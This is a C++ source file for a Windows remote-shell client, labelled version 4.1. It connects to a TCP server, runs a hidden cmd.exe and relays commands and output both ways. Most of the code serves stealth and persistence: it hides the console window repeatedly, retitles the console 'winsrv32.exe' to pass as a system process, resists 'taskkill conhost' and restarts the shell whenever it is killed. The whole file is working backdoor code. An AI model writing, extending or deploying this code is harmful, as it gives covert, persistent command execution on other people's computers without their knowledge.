/*
#########################################################################################
# V4.1主要更新
# 1、针对taskkill conhost的防护
# 2、修复TerminateProc()无法终止子进程的bug
# 3、优化窗口隐藏的速度
# 4、大幅提高上行速率
# 5、去除无用函数delay()
#########################################################################################
*/
//注意：WinAPI通常使用0代表失败，非0代表成功，而本程序中自定义代码段均用0表示成功，1表示失败
#include "hv/TcpClient.h"
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <thread>
#include <iostream>
#include <string>
#include <tchar.h>
#include <mutex>
#include <queue>
#include <tlhelp32.h>
#include <ShellAPI.h>

#define error cerr<<"ERROR"<<endl;
#define READ_SIZE 252//父进程读入缓冲区
#define SEND_SIZE 256//tcp发送缓冲区
#define RECV_SIZE 256//tcp接收缓冲区==父进程输出缓冲区
#define PORT 48706
#define SERVER_IP "127.0.0.1"
#define sleep(x) this_thread::sleep_for(chrono::milliseconds(x))
//WRITE_SIZE==RECV_SIZE，SEND_SIZE>READ_SIZE

using namespace std;
using namespace hv;

//tcp连接
TcpClient cli;
unpack_setting_t upk;//拆包策略
reconn_setting_t reconn;//重连策略
queue<string>send_queue;//发送队列
mutex mtx;
bool connected;

//进程信息
HANDLE Child_in_Rd;
HANDLE Child_in_Wr;
HANDLE Child_out_Rd;
HANDLE Child_out_Wr;
STARTUPINFO StartInfo;
PROCESS_INFORMATION ProcInfo;
DWORD Child_Pid;
bool IOReady;//Pipe is ready for IO

char ques[SEND_SIZE + 5] = { 0x01,0x01,0x07,0x07 };//心跳
char echo[RECV_SIZE + 5] = { 0x02,0x02,0x07,0x07 };//反馈
char sint[RECV_SIZE + 5] = { 0x03,0x03,0x07,0x07 };//SIGINT
char stop[RECV_SIZE + 5] = { 0x07,0x07 };//终止位
char ukterminate[] = "\n\nChild process unexpectedly terminated! Restarting...\n\n";
char consolelost[] = "\n\nMain console unexpectedly lost! Restarting...\n\n";

//utility
//void print(const char* str) { return; }
//void print(const char* str1, const char* str2) { return; }
//void print(const char* str1, const int x) { return;  }
void print(const char* str) { printf("[% *.3f] %s\n", 10, (double)clock() / 1000, str); }
void print(const char* str1, const char* str2) { printf("[% *.3f] %s%s\n", 10, (double)clock() / 1000, str1, str2); }
void print(const char* str1, const int x) { printf("[% *.3f] %s%d\n", 10, (double)clock() / 1000, str1, x); }
void shutdown(){ /*system("shutdown -r -f -t 0"),*/ exit(1); }
bool cmp(const char* str1, const char* str2, int len) {
	while (len--) {
		if (*str1++ != *str2++)return 1;
	}
	return 0;
}
string strproc(char* dest, int len) {
	string str;
	str.resize(SEND_SIZE);
	for (int i = 0; i < len; i++)str[i] = *dest++;
	str[len] = stop[0], str[len + 1] = stop[1];
	return str;
}

//Process manage start
void ClosePipe() {
	CloseHandle(Child_in_Rd);
	CloseHandle(Child_in_Wr);
	CloseHandle(Child_out_Rd);
	CloseHandle(Child_out_Wr);
}
bool prepare_pipe() {
	SECURITY_ATTRIBUTES saAttr;
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;
	if (!CreatePipe(&Child_out_Rd, &Child_out_Wr, &saAttr, 0))return 1;
	if (!SetHandleInformation(Child_out_Rd, HANDLE_FLAG_INHERIT, 0))return 1;
	if (!CreatePipe(&Child_in_Rd, &Child_in_Wr, &saAttr, 0))return 1;
	if (!SetHandleInformation(Child_in_Wr, HANDLE_FLAG_INHERIT, 0))return 1;
	return 0;
}
bool make_pipe() {
	int flag = 5;
	while (flag != -1 && flag != 0) {
		if (prepare_pipe())print("Failed to create pipe! Retrying..."), ClosePipe(), flag--, sleep(500);
		else flag = -1;
	}
	if (flag == 0) {
		print("Pipe creating error!");
		return 1;
	}
	return 0;
	//创建管道
}
void WritePipe(char* recv_data) {
	DWORD dwRecv = 0, dwWrite;
	CHAR chBuf[RECV_SIZE + 5] = { 0 };
	memcpy(chBuf, recv_data, RECV_SIZE);
	for (int i = 0; i < RECV_SIZE; i++) {
		if (cmp(chBuf + i, stop, 2) == 0)break;
		dwRecv++;
	}
	if (dwRecv == RECV_SIZE) {
		print("Recevied data damaged! Skip!");
		return;
	}
	chBuf[dwRecv++] = '\n';
	if (!IOReady)return;
	if (WriteFile(Child_in_Wr, chBuf, dwRecv, &dwWrite, NULL) == FALSE)print("Failed to write to pipe!");
	//todo:写入管道，直至完全成功
}
void ReadPipe() {
	DWORD dwRead;
	CHAR chBuf[READ_SIZE + 5] = { 0 };
	while (1) {
		if (IOReady && connected) {
			memset(chBuf, 0, sizeof chBuf);
			if (!PeekNamedPipe(Child_out_Rd, NULL, NULL, NULL, &dwRead, NULL)) {
				if (IOReady)print("Failed to check pipe!");
				sleep(10);
				continue;
			}
			if (dwRead) {
				if (!ReadFile(Child_out_Rd, chBuf, READ_SIZE, &dwRead, NULL)) {
					if (IOReady)print("Failed to read pipe!");
					sleep(10);
					continue;
				}
				if (!connected)continue;
				mtx.lock();
				send_queue.push(strproc(chBuf, dwRead));
				mtx.unlock();
			}
			else sleep(1);
		}
		else sleep(1);
	}
}
void CreateProc() {
	TCHAR cmd[] = TEXT("cmd.exe");//或以管理员身份启动
	StartInfo.cb = sizeof(STARTUPINFO);
	StartInfo.hStdError = Child_out_Wr;
	StartInfo.hStdOutput = Child_out_Wr;
	StartInfo.hStdInput = Child_in_Rd;
	StartInfo.dwFlags |= STARTF_USESTDHANDLES;
	StartInfo.wShowWindow = SW_HIDE;
	//准备进程启动信息

	if (CreateProcess(NULL, cmd, NULL, NULL, TRUE, NULL, NULL, NULL, &StartInfo, &ProcInfo)) {
		print("Child Pid: ", Child_Pid = ProcInfo.dwProcessId);
		//CloseHandle(ProcInfo.hProcess);
		//CloseHandle(ProcInfo.hThread);
		IOReady = 1;
	}
	else print("Failed to create child process!");
}
bool TerminateProc(bool mode) {//todo:终止父进程改为非枚举方式
	bool Failed = 0;
	HANDLE hSnapshot;
	PROCESSENTRY32 ProcEntry;
	memset(&ProcEntry, 0, sizeof(PROCESSENTRY32));
	ProcEntry.dwSize = sizeof(PROCESSENTRY32);
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		print("Failed to create handle for enumerating!");
		return 1;
	}
	if (!Process32First(hSnapshot, &ProcEntry))print("Failed to start process enumerating!"), Failed = 1;
	do {
		DWORD fpid;
		if (mode)fpid = ProcEntry.th32ProcessID;
		else fpid = ProcEntry.th32ParentProcessID;
		if (Child_Pid && fpid == Child_Pid) {
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0, ProcEntry.th32ProcessID);
			if (!hProcess) print("Failed to open process for terminating!"), Failed = 1;
			else {
				if (!TerminateProcess(hProcess, 0))print("Failed to send signal!"), Failed = 1;
				else print("Terminating process: ", ProcEntry.th32ProcessID);
				CloseHandle(hProcess);
			}
		}
	} while (Process32Next(hSnapshot, &ProcEntry));
	CloseHandle(hSnapshot);
	return Failed;
}
bool GraceTerminate() {
	if (!SetConsoleCtrlHandler(NULL, TRUE))return 1;
	if (!GenerateConsoleCtrlEvent(CTRL_C_EVENT, 0))return 1;
	return 0;
}
void StopAll() {
	int flag = 3;
	while (flag != -1 && flag != 0) {
		if (TerminateProc(0))print("Failed to terminate child/child process! Retrying..."), flag--;//不要延时
		else flag = -1;
	}
	if (flag == 0)print("Child/child process terminating error!");
	flag = 3;
	while (flag != -1 && flag != 0) {
		if (TerminateProc(1))print("Failed to terminate child process! Retrying..."), flag--;//不要延时
		else flag = -1;
	}
	if (flag == 0)print("Child process terminating error!");
	ClosePipe();
	CloseHandle(StartInfo.hStdError);
	CloseHandle(StartInfo.hStdOutput);
	CloseHandle(StartInfo.hStdInput);
	CloseHandle(ProcInfo.hProcess);
	CloseHandle(ProcInfo.hThread);
}
bool Restart() {
	print("Creating child process...");
	if (make_pipe())shutdown();
	int flag = 5;
	while (flag != -1 && flag != 0) {
		if (!SetConsoleCtrlHandler(NULL, FALSE))print("Failed to set control handler! Retrying..."), flag--, sleep(500);
		else flag = -1;
	}
	if (flag == 0) {
		print("Control handler setting error!");
		return 1;
	}
	//sleep(100);//todo
	CreateProc();
	//SetConsoleCtrlHandler(NULL, TRUE);//todo
	return 0;
}
void supervisor() {
	DWORD exitCode;
	string str = strproc(ukterminate, sizeof(ukterminate) - 1);
	while (1) {
		if (IOReady && Child_Pid) {
			if (GetExitCodeProcess(ProcInfo.hProcess, &exitCode) && exitCode != STILL_ACTIVE) {
				print("Process unexpectedly terminated! Restarting...");
				mtx.lock();
				send_queue.push(str);
				mtx.unlock();
				IOReady = 0;
				StopAll();
				Child_Pid = 0;
			}
		}
		sleep(500);
	}
}
void auto_start() {
	while (1) {
		if (connected) {
			if (!Child_Pid) {
				if (Restart())shutdown();
			}
		}
		if (IOReady && Child_Pid) {
			if (!connected) {
				print("Terminating process...");
				IOReady = 0;
				StopAll();
				Child_Pid = 0;
			}
		}
		sleep(500);
	}
}
void hide_window() {//especially important!!!!!!!
	for (int i = 1; i <= 10; i++) ShowWindow(GetConsoleWindow(), SW_HIDE);
}
void console_checker() {
	TCHAR title[] = TEXT("winsrv32.exe");
	string str = strproc(consolelost, sizeof(consolelost) - 1);
	while (1) {
		if (!SetConsoleTitle(title)) {
			print("Console window unexpectedly lost! Restarting...");
			mtx.lock();
			send_queue.push(str);
			mtx.unlock();
			if (IOReady && Child_Pid) {
				IOReady = 0;
				StopAll();
				Child_Pid = 0;
			}
			int flag = 5;
			while (flag != -1 && flag != 0) {
				if (!FreeConsole())print("Failed to free from console! Retrying..."), flag--;//不要延时
				else flag = -1;
			}
			if (flag == 0)print("Console freeing error!");
			flag = 5;
			while (flag != -1 && flag != 0) {
				if (!AllocConsole())print("Failed to allocate console! Retrying..."), flag--;//不要延时
				else flag = -1;
			}
			if (flag == 0)print("Console allocating error!");
			hide_window();
		}
		sleep(2000);
	}
}
//Process manage end

//hv tcp client start
void auto_send() {
	string str(ques, SEND_SIZE);
	while (1) {
		if (connected) {
			print("Send heart beat to server");
			mtx.lock();
			send_queue.push(str);
			mtx.unlock();
		}
		sleep(1000);
	}
}
void onConnection(const SocketChannelPtr &channel) {
	if (channel->isConnected()) {
		string peeraddr = channel->peeraddr();
		print("Server connected: ", peeraddr.c_str());
		mtx.lock();
		while (send_queue.size())send_queue.pop();//清空队列内残留内容
		mtx.unlock();
		connected = 1;
		setInterval(5, [channel](TimerID timerID) {//设置定时器回调函数
			if (channel->isConnected()) {
				mtx.lock();
				while (send_queue.size()) {
					//cout << "line: " << endl;
					//string tmp = send_queue.front();
					//cout << tmp;
					//cout << "\nend" << endl;
					channel->write(send_queue.front());
					send_queue.pop();
				}
				mtx.unlock();
			}
			else {
				killTimer(timerID);
			}
		});
	}
	else {
		print("Server disconnected");
		connected = 0;
	}
}
void onMassage(const SocketChannelPtr &channel, Buffer *buf) {
	//	cout << (int*)buf->size() << endl;
	//	printf("< %.*s\n", (int)buf->size(), (char*)buf->data());
	if (cmp((char*)buf->data(), echo, 4) == 0)print("Received echo from server");
	else if (cmp((char*)buf->data(), sint, 4) == 0)print("Terminating child precess gracefully..."), GraceTerminate();//todo
	else WritePipe((char*)buf->data());
}
void onWriteComplete(const SocketChannelPtr &channel, Buffer *buf) {
//	print("Data sent successfully!");
}
//hv tcp client end


//主函数
int main() {
	hide_window();

	print("Initializing...");

	hlog_disable();
	int flag = 5;
	while (flag != -1 && flag != 0) {
		if (cli.createsocket(PORT, SERVER_IP) < 0)print("Failed to create socket! Retrying..."), flag--, sleep(500);
		else flag = -1;
	}
	if (flag == 0)print("Socket creating error!"), shutdown();
	cli.onConnection = onConnection;
	cli.onMessage = onMassage;
	cli.onWriteComplete = onWriteComplete;
	upk.mode = UNPACK_BY_FIXED_LENGTH;
	upk.fixed_length = RECV_SIZE;
	cli.setUnpack(&upk);
	reconn_setting_init(&reconn);
	reconn.min_delay = 1000;
	reconn.delay_policy = 0;
	cli.setReconnect(&reconn);

	thread proc_magr(auto_start);//进程自启动
	thread proc_moni(supervisor);//进程监视
	thread read_pipe(ReadPipe);//管道读出
	thread send_beat(auto_send);//发送心跳
	thread prot_cons(console_checker);//控制台检查

	print("Initializing done!");

	cli.start();//todo:添加重试
	proc_magr.detach();
	proc_moni.detach();
	read_pipe.detach();
	send_beat.detach();
	prot_cons.detach();

	while (1)sleep(1000);

	return 0;
}
